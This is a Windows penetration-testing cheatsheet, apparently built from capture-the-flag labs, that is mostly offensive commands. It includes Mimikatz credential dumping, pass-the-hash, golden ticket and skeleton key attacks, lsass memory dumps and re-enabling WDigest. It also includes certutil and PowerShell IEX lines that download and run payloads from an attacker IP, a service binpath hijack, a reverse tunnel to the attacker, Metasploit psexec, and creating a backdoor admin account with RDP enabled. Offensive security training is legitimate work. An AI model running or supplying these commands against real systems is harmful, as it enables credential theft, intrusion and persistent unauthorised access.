# Cheatsheet

Commands & prevesc: https://guif.re/windowseop
VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

## Versions 

```
Windows 1.0                    1.04
Windows 2.0                    2.11
Windows 3.0                    3
Windows NT 3.1                 3.10.528
Windows for Workgroups 3.11    3.11
Windows NT Workstation 3.5     3.5.807
Windows NT Workstation 3.51    3.51.1057
Windows 95                     4.0.950
Windows NT Workstation 4.0     4.0.1381
Windows 98                     4.1.1998
Windows 98 Second Edition      4.1.2222
Windows Me                     4.90.3000
Windows 2000 Professional      5.0.2195
Windows XP                     5.1.2600
Windows Vista                  6.0.6000
Windows 7                      6.1.7600
Windows 8.1                    6.3.9600
Windows 10                     10.0.10240
```

## User accounts 

- LocalSystem account is a predefined local account used by the service control manager. 
  - <https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx>
  - Not recognized by the security subsystem, so you cannot specify its name in a call to the `LookupAccountName` function. 
  - Has extensive privileges on the local computer, and acts as the computer on the network. 
  - Its token includes the `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators` SIDs; these accounts have access to most system objects. 
  - The name of the account in all locales is `.\LocalSystem`. 
  - The name, `LocalSystem` or `ComputerName\LocalSystem` can also be used. 
  - This account does not have a password. 
  - If you specify the `LocalSystem` account in a call to the `CreateService` or `ChangeServiceConfig` function, any password information you provide is ignored.
  - The service can open the registry key HKEY_LOCAL_MACHINE\SECURITY.
  - The service presents the computer's credentials to remote servers.
  - If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions.
  - A service that runs in the context of the `LocalSystem` account inherits the security context of the SCM. The user SID is created from the `SECURITY_LOCAL_SYSTEM_RID` value. 
  - Has:
    - E_ASSIGNPRIMARYTOKEN_NAME (disabled)
    - SE_AUDIT_NAME (enabled)
    - SE_BACKUP_NAME (disabled)
    - SE_CHANGE_NOTIFY_NAME (enabled)
    - SE_CREATE_GLOBAL_NAME (enabled)
    - SE_CREATE_PAGEFILE_NAME (enabled)
    - SE_CREATE_PERMANENT_NAME (enabled)
    - SE_CREATE_TOKEN_NAME (disabled)
    - SE_DEBUG_NAME (enabled)
    - SE_IMPERSONATE_NAME (enabled)
    - SE_INC_BASE_PRIORITY_NAME (enabled)
    - SE_INCREASE_QUOTA_NAME (disabled)
    - SE_LOAD_DRIVER_NAME (disabled)
    - SE_LOCK_MEMORY_NAME (enabled)
    - SE_MANAGE_VOLUME_NAME (disabled)
    - SE_PROF_SINGLE_PROCESS_NAME (enabled)
    - SE_RESTORE_NAME (disabled)
    - SE_SECURITY_NAME (disabled)
    - SE_SHUTDOWN_NAME (disabled)
    - SE_SYSTEM_ENVIRONMENT_NAME (disabled)
    - SE_SYSTEMTIME_NAME (disabled)
    - SE_TAKE_OWNERSHIP_NAME (disabled)
    - SE_TCB_NAME (enabled)
    - SE_UNDOCK_NAME (disabled)
- LocalService account is a predefined local account used by the service control manager.
  - <https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx>
  - Not recognized by the security subsystem, so you cannot specify its name in a call to the `LookupAccountName` function. 
  - Has minimum privileges on the local computer and presents anonymous credentials on the network.
  - Can be specified in a call to the `CreateService` and `ChangeServiceConfig` functions. 
  - This account does not have a password, so any password information that you provide in this call is ignored. 
  - While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the `LookupAccountSid` function, but the name of the account must be `NT AUTHORITY\LocalService` when you call `CreateService` or `ChangeServiceConfig`, regardless of the locale, or unexpected results can occur.
  - The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the `HKEY_CURRENT_USER` registry key is associated with the LocalService account.
  - Has:
    - SE_ASSIGNPRIMARYTOKEN_NAME (disabled)
    - SE_AUDIT_NAME (disabled)
    - SE_CHANGE_NOTIFY_NAME (enabled)
    - SE_CREATE_GLOBAL_NAME (enabled)
    - SE_IMPERSONATE_NAME (enabled)
    - SE_INCREASE_QUOTA_NAME (disabled)
    - SE_SHUTDOWN_NAME (disabled)
    - SE_UNDOCK_NAME (disabled)
    - Any privileges assigned to users and authenticated users
- NetworkService account is a predefined local account used by the service control manager. 
  - <https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx>
  - Not recognized by the security subsystem, so you cannot specify its name in a call to the `LookupAccountName` function. 
  - Has minimum privileges on the local computer and acts as the computer on the network.
  - This account can be specified in a call to the `CreateService` and `ChangeServiceConfig` functions. 
  - This account does not have a password, so any password information that you provide in this call is ignored. 
  - While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the `LookupAccountSid` function, but the name of the account must be `NT AUTHORITY\NetworkService` when you call `CreateService` or `ChangeServiceConfig`, regardless of the locale, or unexpected results can occur.
  - A service that runs in the context of the `NetworkService` account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the `SECURITY_NETWORK_SERVICE_RID` value.
  - Has its own subkey under the `HKEY_USERS` registry key. Therefore, the `HKEY_CURRENT_USER` registry key is associated with the NetworkService account.
  - Has:
    - SE_ASSIGNPRIMARYTOKEN_NAME (disabled)
    - SE_AUDIT_NAME (disabled)
    - SE_CHANGE_NOTIFY_NAME (enabled)
    - SE_CREATE_GLOBAL_NAME (enabled)
    - SE_IMPERSONATE_NAME (enabled)
    - SE_INCREASE_QUOTA_NAME (disabled)
    - SE_SHUTDOWN_NAME (disabled)
    - SE_UNDOCK_NAME (disabled)
    - Any privileges assigned to users and authenticated users



## Mimikatz

```
privilege::debug

sekurlsa::logonPasswords full
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

misc::skeleton

ipconfig /all
whoami /user
lsadump::lsa /inject /name:krbtgt
kerbros::golden /domain:[Domain] /sid:[SID] /rc4:[NTLM Hash] /user:[Username To Create] /id:500 /ptt
pushd \\WINSERVER01\c$
cd WINDOWS\NTDS
```

If WDigest is disabled:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

Export memory dump and use it in Mimikatz:
```
Get-Process lsass | Out-Minidump
sekurlsa::minidump lsass_592.dmp
```

Using VMWare / Hibernate file: http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/
Mimikatz features: https://adsecurity.org/?page_id=1821

## PsExec

https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec
https://www.toshellandback.com/2017/02/11/psexec/
http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html

## Open password protected share

```
net use \\server\share /user:test testpassword
start \\server\share
```

## Convert string to little-endian

```
iconv -to-code UTF-16LE
```

> Should be done before base64 encoding for -ExecuteCommand in powershell

## Recon

- IP, subnet, default gateway etc: `ipconfig /all`

- Current user name, info in current access token, SID, privs and group that current user belongs to: `whoami /all`

- Local groups on current machine: `net localgroup`

- Local administrators of current machine: `net localgroup "administrators"`

- Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: `netstat -an`
- Running processes with verbose mode: `tasklist /V`
- Startup programs: `net start`
- Windows services with binary paths: `sc qc <service>`
- OS, processor, memory, bios related info: `systeminfo>output.txt`
- Scheduled jobs: `schtasks /query /fo LIST /v`
- Patches installed and figuring out if its missing important any patch: `wmic qfe get Caption,Description,HotFixID,InstalledOn`

## Domain Network Recon

- Mapping of IP address to its MAC address in the network: `arp -a`
- Domain: `echo %USERDOMAIN%`
- Domain controller name: `echo %logonserver%`
- List of domain users: `net user /domain`
- List of groups in the domain: `net group /domain`
- AD domain password policy: `net accounts /domain`
- Map AD trust relationships: `nltest /domain_trusts`

## Moving files

> - Ref: <http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html>

```
certutil -verifyctl -split -f ​ http://10.10.14.8/taskkill.exe
mv *.bin taskkill.exe
```

## Extract ZIP

```
Add-Type -assembly
'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory
("C:\backup.zip","C:\Example\")
```

## View File Systems

```
gdr -PSProvider 'FileSystem'
```

## Access shared volume

```
net use y: \\10.10.10.57\c$ /user:administrator 1234test
```

## Invoke command with credentials

```
$user = '.\administrator';
$psw = '1234test';
$secpsw = ConvertTo-SecureString $psw -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $user, $secpsw
```

```
invoke-command -computername localhost -credential $credential
-scriptblock {cd C:\Users\Administrator\Desktop\;C:\Users\Administrator\Desktop\root.exe}
```

## Alternate Data Stream

- Listing: `dir /R`
- Find Streams: `​get-item -path *.* -stream *`
- Reading: `​powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
- Reading: `get-content backup.zip -stream 'pass'`
- Reading: `streams.exe /accepteula -s` from sysinternals

## MSI

### Installing MSI

```
msiexec /quiet /qn /i malicious.msi
```

```
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

## Services

- Registry entries: `HKLM\SYSTEM\CurrentControlSet\Services`
- View service properties: `sc qc "Vulnerable Service"` / `net start`
- Restarting: `sc stop "Vulnerable Service"` /  `net stop <name>`
- Start: `sc start "Vulnerable Service"` /  `net start <name>`
- Service information: `Get-Service​ ​ "Ubiquiti UniFi Video"​ | fl *`
- Restart PC: `shutdown /r /t 0`
- Change binary path: `sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add`
- Disable: `sc config servicename start= disabled`
- Enable: `sc config servicename start= demand`
- Auto: `sc config servicename start= auto`
-

### Keep alive

When a service starts in Windows operating systems, it must communicate with the `Service Control Manager`. If it's not, `Service Control Manager` will terminates the process.

## Auto Save Password to PowerShell

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

```
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)​

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds
```

## Permissions

```
whoami /priv
```

### View Permisions

```
cacls C:\Users\Administrator\Desktop\root.txt
```

### Grant Permissions

```
cacls C:\Users\Administrator\Desktop\root.txt /grant Alfred:F
```
```
cacls "c:\users\Administrator\Desktop\root.txt" /E /P Alfred:F

cacls Windows utility to view/edit file permissions
/E to edit ACL
/P to set permissions
Alfred:F to give Alfred full control of the file
```

## SSH from Windows to Attacker (Kali)

### Manual

From Windows:

```
plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8
```

From Attacker:

```
netstat -ano | grep 445
winexe -U Administrator //127.0.0.1 "cmd.exe"
```

### Metasploit

```
portfwd add -l 445 -p 445 -r 127.0.0.1
use exploit/windows/smb/psexec
 set SMBDOMAIN CHATTERBOX
 set SMBUSER Administrators
 set SMBPASS Welcome1!
 set RHOST 127.0.0.1
exploit
```

## Enumeration Tips

> Ref: <https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/>

- Check the policies related to Network Access Control. Whether it can be bypassed or not.
- Go for guest wifi. It could lead you to get inside the company network if it is not segregated.
- Check for the printers in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords.
- Check for misconfigurations in the systems as well as the network.
- At the Domain level, always look for "Administrators" group members instead of going just for "Domain Admins". Reason being Builtin Administrators group is the superior one. Even "Domain Admins" group is also the member of administrators groups.
- Look for User Rights Assignments in the GPOs. They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights.
- Most of the organizations use the same image for all of their deployments. Which means they use same local admin password. Always check if same local admin account is being used in whole domain.
- Identify Admin Restrictions. (Logon Hours, LogonWorkstations) Decoys can be detected using this.
- Use Responder to collect NTLM hashes.
- Check [SYSVOL](https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx) too.
- ShareEnum to look for file shares.

## Add user and enable RDP

```
net user hacker hacker /add
net localgroup /add Administrators hacker
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

# References:

- [Windows file association](https://stackoverflow.com/questions/23074430/how-to-run-vbscript-from-command-line-without-cscript-wscript)
